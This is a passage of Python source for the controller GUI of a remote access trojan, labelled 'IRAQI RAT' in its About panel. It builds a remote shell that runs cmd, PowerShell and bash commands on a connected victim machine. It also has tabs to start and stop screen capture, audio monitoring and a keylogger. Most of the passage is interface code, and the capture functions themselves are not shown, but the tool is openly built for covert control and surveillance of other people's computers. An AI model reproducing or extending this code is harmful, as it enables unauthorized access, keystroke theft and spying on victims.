                                    button_color=theme["button_color"],
                                    button_hover_color=theme["hover_color"])
        mode_menu.pack(side=tk.LEFT)
        
        # Output terminal with enhanced styling
        terminal_frame = ctk.CTkFrame(self.command_frame, fg_color=theme["card_color"])
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Determine terminal colors based on theme and mode
        terminal_bg, terminal_fg = self.get_terminal_colors()
        
        # Output text area with proper font for terminal
        self.terminal_output = scrolledtext.ScrolledText(
            terminal_frame, 
            wrap=tk.WORD, 
            background=terminal_bg, 
            foreground=terminal_fg, 
            font=("Consolas", 10),
            borderwidth=0,
            highlightthickness=1,
            highlightbackground=theme["accent_color"],
            highlightcolor=theme["accent_color"],
            insertbackground=terminal_fg,
            insertwidth=2
        )
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure terminal text tags for different message types
        self.terminal_output.tag_configure("error", foreground="red")
        self.terminal_output.tag_configure("success", foreground="green")
        self.terminal_output.tag_configure("warning", foreground="orange")
        self.terminal_output.tag_configure("command", foreground=theme["accent_color"])
        self.terminal_output.tag_configure("output", foreground=terminal_fg)
        self.terminal_output.tag_configure("system", foreground="cyan")
        
        # Add initial welcome message
        self.terminal_output.insert(tk.END, "Enhanced Command Shell\n", "system")
        self.terminal_output.insert(tk.END, "Type commands and press Enter to execute on the connected client.\n", "system")
        self.terminal_output.insert(tk.END, "Use Up/Down arrows to navigate command history.\n\n", "system")
        self.terminal_output.configure(state="disabled")
        
        # Command input area with enhanced features
        input_frame = ctk.CTkFrame(self.command_frame, fg_color=theme["card_color"])
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Dynamic prompt label based on mode
        self.prompt_label = ctk.CTkLabel(input_frame, text="cmd>", width=80, 
                                    anchor="e", font=("Consolas", 12))
        self.prompt_label.pack(side=tk.LEFT, padx=5)
        
        # Command input with history support
        self.command_input = ctk.CTkEntry(input_frame, 
                                    fg_color=terminal_bg,
                                    text_color=terminal_fg,
                                    font=("Consolas", 12),
                                    border_width=0)
        self.command_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Bind events for command history and other features
        self.command_input.bind("<Return>", self.send_command)
        self.command_input.bind("<Up>", self.previous_command)
        self.command_input.bind("<Down>", self.next_command)
        self.command_input.bind("<Tab>", self.auto_complete)
        
        # Command history
        self.command_history = []
        self.history_index = -1
        
        # Auto-completion suggestions 
        self.common_commands = {
            "cmd": [
                "ipconfig", "systeminfo", "tasklist", "netstat", "dir", 
                "whoami", "hostname", "ping", "tracert", "net user",
                "net localgroup", "net share", "net view", "net start",
                "sfc /scannow", "dism", "reg query", "findstr", "type", 
                "cd", "copy", "move", "mkdir", "rmdir", "del"
            ],
            "powershell": [
                "Get-Process", "Get-Service", "Get-Item", "Get-Content", 
                "Get-WmiObject", "Get-EventLog", "Get-NetAdapter", 
                "Get-ComputerInfo", "Get-ChildItem", "Set-Location",
                "Write-Output", "Invoke-Command", "Invoke-WebRequest"
            ],
            "bash": [
                "ls", "cd", "pwd", "cat", "grep", "find", "ps", "top", 
                "netstat", "ifconfig", "mkdir", "touch", "chmod", "chown",
                "who", "whoami", "history", "uname", "echo", "ssh"
            ]
        }
        
        # Send button with enhanced styling
        send_btn = ctk.CTkButton(input_frame, text="Send", 
                            command=lambda: self.send_command(None),
                            fg_color=theme["accent_color"],
                            hover_color=theme["hover_color"],
                            text_color="#ffffff",
                            corner_radius=8,
                            height=32)
        send_btn.pack(side=tk.RIGHT, padx=5)
        
        # Create status bar for command results
        self.cmd_status_bar = ctk.CTkLabel(self.command_frame, text="Ready", height=20, 
                                        anchor="w", corner_radius=5,
                                        fg_color=theme["card_color"])
        self.cmd_status_bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Track widgets with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(info_frame)
            self.theme_manager.track_widget(cmd_buttons_frame)
            self.theme_manager.track_widget(terminal_frame)
            self.theme_manager.track_widget(input_frame)
            self.theme_manager.track_widget(self.cmd_status_bar)
            self.theme_manager.track_widget(self.terminal_output, "scrolledtext")
            self.theme_manager.track_widget(self.command_input)
            self.theme_manager.track_widget(send_btn)

    def get_terminal_colors(self):
        """Get appropriate terminal colors based on theme and mode"""
        theme = self.THEMES[self.current_theme]
        mode = self.terminal_mode.get() if hasattr(self, 'terminal_mode') else "cmd"
        
        if mode == "cmd":
            # Classic CMD blue background
            return "#0C0C0C", "#CCCCCC"  # Dark background, light text
        elif mode == "powershell":
            # PowerShell blue
            return "#012456", "#CCCCCC"  # Blue background, light text 
        elif mode == "bash":
            # Dark terminal for bash
            return "#1E1E1E", "#33FF33"  # Dark background, green text
        else:
            # Default theme colors
            return theme["bg_color"], theme["fg_color"]

    def change_terminal_mode(self, mode):
        """Change the terminal mode and update the prompt"""
        if mode == "cmd":
            self.prompt_label.configure(text="cmd>")
        elif mode == "powershell":
            self.prompt_label.configure(text="PS>")
        elif mode == "bash":
            self.prompt_label.configure(text="bash$")
        
        # Update terminal colors based on the new mode
        terminal_bg, terminal_fg = self.get_terminal_colors()
        self.terminal_output.configure(background=terminal_bg, foreground=terminal_fg)
        self.command_input.configure(fg_color=terminal_bg, text_color=terminal_fg)
        
        # Add mode change notification
        self.terminal_output.configure(state="normal")
        self.terminal_output.insert(tk.END, f"\nSwitched to {mode} mode\n\n", "system")
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        # Clear command input
        self.command_input.delete(0, tk.END)

    def quick_command(self, command):
        """Execute a quick command from the buttons"""
        if not self.current_client_socket:
            self.show_command_error("Not connected to any client")
            return
        
        # Set the command in the input field
        self.command_input.delete(0, tk.END)
        self.command_input.insert(0, command)
        
        # Execute the command
        self.send_command(None)

    def clear_terminal(self):
        """Clear the terminal output"""
        self.terminal_output.configure(state="normal")
        self.terminal_output.delete(1.0, tk.END)
        self.terminal_output.insert(tk.END, "Terminal cleared\n\n", "system")
        self.terminal_output.configure(state="disabled")
        self.cmd_status_bar.configure(text="Terminal cleared")

    def send_command(self, event):
        """Send a command to the connected client with enhanced features"""
        if not self.current_client_socket:
            self.show_command_error("Not connected to any client")
            return
        
        command = self.command_input.get().strip()
        if not command:
            return
        
        # Add command to history
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.history_index = len(self.command_history)
        
        # Update terminal with command
        self.terminal_output.configure(state="normal")
        
        # Display prompt based on current mode
        prompt = self.prompt_label.cget("text") + " "
        self.terminal_output.insert(tk.END, prompt, "system")
        self.terminal_output.insert(tk.END, command + "\n", "command")
        
        # Show command is running
        self.cmd_status_bar.configure(text=f"Running: {command}...")
        
        try:
            # Special commands handled locally
            if command.lower() == "clear" or command.lower() == "cls":
                self.clear_terminal()
                self.command_input.delete(0, tk.END)
                return
            elif command.lower() == "exit" or command.lower() == "quit":
                self.disconnect_client()
                self.terminal_output.insert(tk.END, "Disconnected from client\n\n", "system")
                self.terminal_output.configure(state="disabled")
                self.command_input.delete(0, tk.END)
                return
            elif command.lower().startswith("cd ") and self.terminal_mode.get() != "bash":
                # Handle CD commands specially (they need to be persistent on Windows)
                try:
                    # For Windows clients, we need to handle CD specially
                    dir_path = command[3:].strip()
                    # Send a dir command to test if the path exists
                    test_cmd = f'if exist "{dir_path}" (echo DIR_EXISTS) else (echo DIR_NOT_FOUND)'
                    result, _ = self.send_cmd(self.current_client_socket, test_cmd)
                    result_text = result.decode().strip()
                    
                    if "DIR_EXISTS" in result_text:
                        # Set the current directory
                        change_dir_cmd = f'cd /d "{dir_path}" && echo Current directory: %cd%'
                        result, _ = self.send_cmd(self.current_client_socket, change_dir_cmd)
                        self.terminal_output.insert(tk.END, result.decode(), "success")
                    else:
                        self.terminal_output.insert(tk.END, f"The system cannot find the path specified: {dir_path}\n", "error")
                except Exception as e:
                    self.terminal_output.insert(tk.END, f"Error changing directory: {str(e)}\n", "error")
                    
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
                self.command_input.delete(0, tk.END)
                return
            
            # Modify command based on terminal mode
            if self.terminal_mode.get() == "powershell" and not command.lower().startswith("powershell "):
                # Wrap command in powershell
                exec_command = f'powershell -Command "{command}"'
            elif self.terminal_mode.get() == "bash" and not command.lower().startswith("bash "):
                # Wrap command in bash if available
                exec_command = f'bash -c "{command}"'
            else:
                exec_command = command
            
            # Send command to client
            start_time = time.time()
            result, size = self.send_cmd(self.current_client_socket, exec_command)
            end_time = time.time()
            
            # Display result
            execution_time = end_time - start_time
            
            # Insert command output
            self.terminal_output.insert(tk.END, result.decode(), "output")
            
            # Add extra newline for readability
            if not result.decode().endswith('\n'):
                self.terminal_output.insert(tk.END, "\n")
            self.terminal_output.insert(tk.END, "\n")
            
            # Update status bar
            self.cmd_status_bar.configure(text=f"Command completed in {execution_time:.2f} seconds (Size: {self.format_size(size)})")
            
        except ConnectionError as e:
            self.terminal_output.insert(tk.END, f"Connection Error: {str(e)}\n", "error")
            self.cmd_status_bar.configure(text="Connection Error")
            # Update connection status
            self.update_connection_status(False)
            
        except Exception as e:
            self.terminal_output.insert(tk.END, f"Error: {str(e)}\n", "error")
            self.cmd_status_bar.configure(text=f"Error: {str(e)}")
        
        # Scroll to the end and disable editing
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        # Clear command input
        self.command_input.delete(0, tk.END)

    def previous_command(self, event):
        """Navigate to the previous command in history"""
        if not self.command_history:
            return "break"
            
        if self.history_index > 0:
            self.history_index -= 1
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, self.command_history[self.history_index])
            
        return "break"  # Prevent default behavior

    def next_command(self, event):
        """Navigate to the next command in history"""
        if not self.command_history:
            return "break"
            
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, self.command_history[self.history_index])
        elif self.history_index == len(self.command_history) - 1:
            # At the end of history, clear the input
            self.history_index = len(self.command_history)
            self.command_input.delete(0, tk.END)
            
        return "break"  # Prevent default behavior

    def auto_complete(self, event):
        """Provide auto-completion for common commands"""
        current_text = self.command_input.get()
        current_mode = self.terminal_mode.get()
        
        # Get appropriate command list based on mode
        command_list = self.common_commands.get(current_mode, [])
        
        # Find matching commands
        matches = [cmd for cmd in command_list if cmd.lower().startswith(current_text.lower())]
        
        if matches:
            # Replace with the first match
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, matches[0])
            
            # If there are multiple matches, show them in the terminal
            if len(matches) > 1:
                self.terminal_output.configure(state="normal")
                self.terminal_output.insert(tk.END, "\nMatches: " + ", ".join(matches) + "\n\n", "system")
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
        
        return "break"  # Prevent default behavior

    def show_command_error(self, message):
        """Display command error in the terminal and status bar"""
        self.terminal_output.configure(state="normal")
        self.terminal_output.insert(tk.END, f"Error: {message}\n\n", "error")
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        self.cmd_status_bar.configure(text=f"Error: {message}")

    def update_connection_status(self, connected=True):
        """Update the connection status indicator"""
        theme = self.THEMES[self.current_theme]
        
        if connected:
            self.connection_status_indicator.configure(text="", text_color=theme["success_color"])
        else:
            self.connection_status_indicator.configure(text="", text_color=theme["danger_color"])

    def format_size(self, size_bytes):
        """Format byte size to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"

        
    def setup_monitoring_tab(self):
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        self.theme_manager = ThemeManager(self, theme)
        
        # Create tab control with improved styling
        monitor_notebook = ttk.Notebook(self.monitoring_frame, style="Custom.TNotebook")
        monitor_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Screen tab with enhanced UI
        screen_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(screen_frame, text="Screen")
        
        # Top control panel with better styling
        screen_controls = ctk.CTkFrame(screen_frame, fg_color=theme["card_color"], corner_radius=8)
        screen_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        screen_title = ctk.CTkLabel(screen_controls, text="Screen Capture Controls", 
                                font=ctk.CTkFont(size=14, weight="bold"),
                                text_color=theme["fg_color"])
        screen_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        screen_separator = ttk.Separator(screen_controls, orient='horizontal')
        screen_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        screen_btn_container = ctk.CTkFrame(screen_controls, fg_color="transparent")
        screen_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        # Enhanced buttons with improved styling
        self.start_screen_btn = ctk.CTkButton(screen_btn_container, text="Start Screen Capture", 
                                            command=self.start_screen_capture,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            corner_radius=6,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.start_screen_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stop_screen_btn = ctk.CTkButton(screen_btn_container, text="Stop Screen Capture", 
                                            command=self.stop_screen_capture, 
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            corner_radius=6,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.stop_screen_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Add a frame for the image display with border and rounded corners
        self.screen_display_frame = ctk.CTkFrame(screen_frame, fg_color=theme["card_color"], 
                                            corner_radius=10,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.screen_display_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Screen capture display with improved styling
        self.screen_display = tk.Label(self.screen_display_frame, text="No screen capture active", 
                                    background=theme["bg_color"],
                                    foreground=theme["fg_color"],
                                    font=("Arial", 12))
        self.screen_display.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
        
        # Audio tab with enhanced UI
        audio_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(audio_frame, text="Audio")
        
        # Top control panel for audio
        audio_controls = ctk.CTkFrame(audio_frame, fg_color=theme["card_color"], corner_radius=8)
        audio_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        audio_title = ctk.CTkLabel(audio_controls, text="Audio Monitoring Controls", 
                                font=ctk.CTkFont(size=14, weight="bold"),
                                text_color=theme["fg_color"])
        audio_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        audio_separator = ttk.Separator(audio_controls, orient='horizontal')
        audio_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        audio_btn_container = ctk.CTkFrame(audio_controls, fg_color="transparent")
        audio_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        self.start_audio_btn = ctk.CTkButton(audio_btn_container, text="Start Audio Monitoring", 
                                        command=self.start_audio_monitoring,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        corner_radius=6,
                                        border_width=1,
                                        border_color=theme["border_color"] if "border_color" in theme else None)
        self.start_audio_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stop_audio_btn = ctk.CTkButton(audio_btn_container, text="Stop Audio Monitoring", 
                                        command=self.stop_audio_monitoring, 
                                        state="disabled",
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        corner_radius=6,
                                        border_width=1,
                                        border_color=theme["border_color"] if "border_color" in theme else None)
        self.stop_audio_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Audio visualization placeholder with improved styling
        self.audio_display_frame = ctk.CTkFrame(audio_frame, fg_color=theme["card_color"], 
                                            corner_radius=10,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.audio_display_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Audio visualization placeholder
        self.audio_display = tk.Label(self.audio_display_frame, text="No audio monitoring active", 
                                    background=theme["bg_color"],
                                    foreground=theme["fg_color"],
                                    font=("Arial", 12))
        self.audio_display.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Keyboard tab with enhanced UI
        keyboard_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(keyboard_frame, text="Keyboard")
        
        # Top control panel for keyboard
        keyboard_controls = ctk.CTkFrame(keyboard_frame, fg_color=theme["card_color"], corner_radius=8)
        keyboard_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        keyboard_title = ctk.CTkLabel(keyboard_controls, text="Keyboard Monitoring Controls", 
                                    font=ctk.CTkFont(size=14, weight="bold"),
                                    text_color=theme["fg_color"])
        keyboard_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        keyboard_separator = ttk.Separator(keyboard_controls, orient='horizontal')
        keyboard_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        keyboard_btn_container = ctk.CTkFrame(keyboard_controls, fg_color="transparent")
        keyboard_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        self.start_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="Start Keylogger", 
                                            command=self.start_keylogger,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            corner_radius=6,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.start_keyboard_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.stop_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="Stop Keylogger", 
                                            command=self.stop_keylogger, 
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            corner_radius=6,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.stop_keyboard_btn.pack(side=tk.LEFT, padx=5, pady=5)
        
        # Add clear button
        self.clear_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="Clear Log", 
                                            command=lambda: self.keyboard_log.delete(1.0, tk.END),
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            corner_radius=6,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.clear_keyboard_btn.pack(side=tk.RIGHT, padx=5, pady=5)
        
        # Improved keyboard log with styling
        self.keyboard_log_frame = ctk.CTkFrame(keyboard_frame, fg_color=theme["card_color"], 
                                            corner_radius=10,
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.keyboard_log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.keyboard_log = scrolledtext.ScrolledText(self.keyboard_log_frame, 
                                                    wrap=tk.WORD, 
                                                    background=theme["bg_color"], 
                                                    foreground=theme["fg_color"],
                                                    font=("Consolas", 10),
                                                    insertbackground=theme["fg_color"])
        self.keyboard_log.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Track monitor notebook for theme changes
        self.theme_manager.track_widget(monitor_notebook, "notebook")
        
    def setup_settings_tab(self):
        """Set up an enhanced settings tab with comprehensive configuration options"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create a main container with scrolling capability
        main_container = ctk.CTkScrollableFrame(self.settings_frame, fg_color="transparent")
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # ===== SERVER SETTINGS SECTION =====
        server_settings_frame = ctk.CTkFrame(main_container, fg_color=theme["card_color"], corner_radius=10)
        server_settings_frame.pack(fill=tk.X, padx=5, pady=5)
        
        server_header = ctk.CTkLabel(server_settings_frame, text="Server Settings", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        server_header.pack(anchor="w", padx=15, pady=10)
        
        # Server default address settings
        address_frame = ctk.CTkFrame(server_settings_frame, fg_color="transparent")
        address_frame.pack(fill=tk.X, padx=15, pady=5)
        
        # Default IP
        ip_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        ip_row.pack(fill=tk.X, pady=3)
        
        ip_label = ctk.CTkLabel(ip_row, text="Default IP:", width=150)
        ip_label.pack(side=tk.LEFT, padx=5)
        
        self.default_ip_entry = ctk.CTkEntry(ip_row, width=200, 
                                        fg_color=theme["bg_color"],
                                        text_color=theme["fg_color"])
        self.default_ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.default_ip_entry.insert(0, self.ip)
        
        ip_help_btn = ctk.CTkButton(ip_row, text="?", width=30, height=30,
                                corner_radius=15, 
                                command=lambda: self.show_tooltip("IP Address", 
                                                                "The default IP address the server will listen on.\n\n"
                                                                "Use 0.0.0.0 to listen on all interfaces,\n"
                                                                "127.0.0.1 for local connections only."))
        ip_help_btn.pack(side=tk.RIGHT, padx=5)
        
        # Default Port
        port_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        port_row.pack(fill=tk.X, pady=3)
        
        port_label = ctk.CTkLabel(port_row, text="Default Port:", width=150)
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.default_port_entry = ctk.CTkEntry(port_row, width=200, 
                                            fg_color=theme["bg_color"],
                                            text_color=theme["fg_color"])
        self.default_port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.default_port_entry.insert(0, str(self.port))
        
        port_help_btn = ctk.CTkButton(port_row, text="?", width=30, height=30,
                                    corner_radius=15, 
                                    command=lambda: self.show_tooltip("Port Number", 
                                                                    "The default port the server will listen on.\n\n"
                                                                    "Valid ports are 1-65535. Ports below 1024\n"
                                                                    "often require administrator privileges."))
        port_help_btn.pack(side=tk.RIGHT, padx=5)
        
        # Buffer size
        buffer_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        buffer_row.pack(fill=tk.X, pady=3)
        
        buffer_label = ctk.CTkLabel(buffer_row, text="Buffer Size:", width=150)
        buffer_label.pack(side=tk.LEFT, padx=5)
        
        self.buffer_entry = ctk.CTkEntry(buffer_row, width=200, 
                                    fg_color=theme["bg_color"],
                                    text_color=theme["fg_color"])
        self.buffer_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.buffer_entry.insert(0, str(self.BUFFER))
        
        buffer_help_btn = ctk.CTkButton(buffer_row, text="?", width=30, height=30,
                                    corner_radius=15, 
                                    command=lambda: self.show_tooltip("Buffer Size", 
                                                                    "The socket buffer size in bytes.\n\n"
                                                                    "Larger values allow more data to be sent at once,\n"
                                                                    "but consume more memory. Default: 4096"))
        buffer_help_btn.pack(side=tk.RIGHT, padx=5)
        
        # Timeout settings
        timeout_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        timeout_row.pack(fill=tk.X, pady=3)
        
        timeout_label = ctk.CTkLabel(timeout_row, text="Connection Timeout:", width=150)
        timeout_label.pack(side=tk.LEFT, padx=5)
        
        self.timeout_entry = ctk.CTkEntry(timeout_row, width=200, 
                                        fg_color=theme["bg_color"],
                                        text_color=theme["fg_color"])
        self.timeout_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.timeout_entry.insert(0, str(getattr(self, "CONNECTION_TIMEOUT", 10)))
        
        timeout_help_btn = ctk.CTkButton(timeout_row, text="?", width=30, height=30,
                                    corner_radius=15, 
                                    command=lambda: self.show_tooltip("Connection Timeout", 
                                                                        "How long to wait (in seconds) for a client response\n"
                                                                        "before considering the connection timed out."))
        timeout_help_btn.pack(side=tk.RIGHT, padx=5)
        
        # Auto-start server option
        autostart_frame = ctk.CTkFrame(server_settings_frame, fg_color="transparent")
        autostart_frame.pack(fill=tk.X, padx=15, pady=5)
        
        self.autostart_var = tk.BooleanVar(value=getattr(self, "AUTO_START_SERVER", False))
        autostart_check = ctk.CTkCheckBox(autostart_frame, text="Auto-start server when application launches", 
                                    variable=self.autostart_var,
                                    onvalue=True, offvalue=False,
                                    fg_color=theme["accent_color"])
        autostart_check.pack(side=tk.LEFT, padx=5)
        
        # ===== USER INTERFACE SETTINGS SECTION =====
        ui_settings_frame = ctk.CTkFrame(main_container, fg_color=theme["card_color"], corner_radius=10)
        ui_settings_frame.pack(fill=tk.X, padx=5, pady=10)
        
        ui_header = ctk.CTkLabel(ui_settings_frame, text="User Interface Settings", 
                            font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                            size=FONT_STYLES["subheading"][1], 
                                            weight=FONT_STYLES["subheading"][2]))
        ui_header.pack(anchor="w", padx=15, pady=10)
        
        # Theme selection
        theme_frame = ctk.CTkFrame(ui_settings_frame, fg_color="transparent")
        theme_frame.pack(fill=tk.X, padx=15, pady=5)
        
        theme_label = ctk.CTkLabel(theme_frame, text="Visual Theme:", width=150)
        theme_label.pack(side=tk.LEFT, padx=5)
        
        theme_options = list(self.THEMES.keys())
        theme_dropdown = ctk.CTkOptionMenu(theme_frame, values=theme_options, 
                                        variable=self.theme_var,
                                        command=self.change_theme,
                                        width=200, 
                                        fg_color=theme["button_color"],
                                        button_color=theme["button_color"],
                                        button_hover_color=theme["hover_color"])
        theme_dropdown.pack(side=tk.LEFT, padx=5)
        
        
        # ===== MONITORING SETTINGS SECTION =====
        monitoring_frame = ctk.CTkFrame(main_container, fg_color=theme["card_color"], corner_radius=10)
        monitoring_frame.pack(fill=tk.X, padx=5, pady=5)
        
        monitoring_header = ctk.CTkLabel(monitoring_frame, text="Monitoring Settings", 
                                    font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                    size=FONT_STYLES["subheading"][1], 
                                                    weight=FONT_STYLES["subheading"][2]))
        monitoring_header.pack(anchor="w", padx=15, pady=10)
        
        # Screenshot quality slider
        screenshot_frame = ctk.CTkFrame(monitoring_frame, fg_color="transparent")
        screenshot_frame.pack(fill=tk.X, padx=15, pady=5)
        
        screenshot_label = ctk.CTkLabel(screenshot_frame, text="Screenshot Quality:", width=150)
        screenshot_label.pack(side=tk.LEFT, padx=5)
        
        self.screenshot_quality_var = tk.IntVar(value=getattr(self, "SCREENSHOT_QUALITY", 30))
        screenshot_slider = ctk.CTkSlider(screenshot_frame, from_=1, to=100, 
                                        number_of_steps=20,
                                        variable=self.screenshot_quality_var,
                                        command=self.update_screenshot_quality)
        screenshot_slider.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.screenshot_quality_label = ctk.CTkLabel(screenshot_frame, 
                                                text=f"{self.screenshot_quality_var.get()}%", 
                                                width=50)
        self.screenshot_quality_label.pack(side=tk.LEFT, padx=5)
        
        # Screenshot FPS slider
        screenshot_fps_frame = ctk.CTkFrame(monitoring_frame, fg_color="transparent")
        screenshot_fps_frame.pack(fill=tk.X, padx=15, pady=5)
        
        screenshot_fps_label = ctk.CTkLabel(screenshot_fps_frame, text="Screenshot FPS:", width=150)
        screenshot_fps_label.pack(side=tk.LEFT, padx=5)
        
        # Convert interval to FPS
        current_interval = getattr(self, "SCREENSHOT_INTERVAL", 1/10)
        current_fps = int(1 / current_interval)
        
        self.screenshot_fps_var = tk.IntVar(value=current_fps)
        screenshot_fps_slider = ctk.CTkSlider(screenshot_fps_frame, from_=1, to=30, 
                                            number_of_steps=29,
                                            variable=self.screenshot_fps_var,
                                            command=self.update_screenshot_fps)
        screenshot_fps_slider.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        self.screenshot_fps_label = ctk.CTkLabel(screenshot_fps_frame, text=f"{current_fps} FPS", width=50)
        self.screenshot_fps_label.pack(side=tk.LEFT, padx=5)
        
        
        # ===== BUTTONS SECTION =====
        button_frame = ctk.CTkFrame(main_container, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=5, pady=15)
        
        # Auto-save settings
        self.autosave_var = tk.BooleanVar(value=True)
        autosave_check = ctk.CTkCheckBox(button_frame, text="Auto-save settings on exit", 
                                    variable=self.autosave_var,
                                    onvalue=True, offvalue=False,
                                    fg_color=theme["accent_color"])
        autosave_check.pack(side=tk.LEFT, padx=5)
        
        # Save Settings button
        save_settings_btn = ctk.CTkButton(button_frame, text="Save Settings", 
                                        command=self.save_settings,
                                        fg_color=theme["accent_color"],
                                        hover_color=theme["hover_color"])
        save_settings_btn.pack(side=tk.RIGHT, padx=5)
        
        # Load Settings button
        load_settings_btn = ctk.CTkButton(button_frame, text="Load Settings", 
                                        command=self.load_settings,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"])
        load_settings_btn.pack(side=tk.RIGHT, padx=5)
        
        # Default Settings button
        default_settings_btn = ctk.CTkButton(button_frame, text="Restore Defaults", 
                                        command=self.restore_default_settings,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"])
        default_settings_btn.pack(side=tk.RIGHT, padx=5)
        
        # ===== HELP SECTION =====
        help_frame = ctk.CTkFrame(main_container, fg_color=theme["card_color"], corner_radius=10)
        help_frame.pack(fill=tk.X, padx=5, pady=5)
        
        about_header = ctk.CTkLabel(help_frame, text="About", 
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        about_header.pack(anchor="w", padx=15, pady=10)
        
        about_text = ctk.CTkLabel(help_frame, 
                            text="IRAQI RAT BY << Apkaless\nVersion 1.0",
                            justify="center")
        about_text.pack(pady=5)
        
        # Help and Documentation buttons
        help_buttons_frame = ctk.CTkFrame(help_frame, fg_color="transparent")
        help_buttons_frame.pack(fill=tk.X, padx=15, pady=10)
        
        docs_btn = ctk.CTkButton(help_buttons_frame, text="Don't Click", 
                            command=self.open_anonymous,
                            fg_color=theme["button_color"],
                            hover_color=theme["hover_color"])
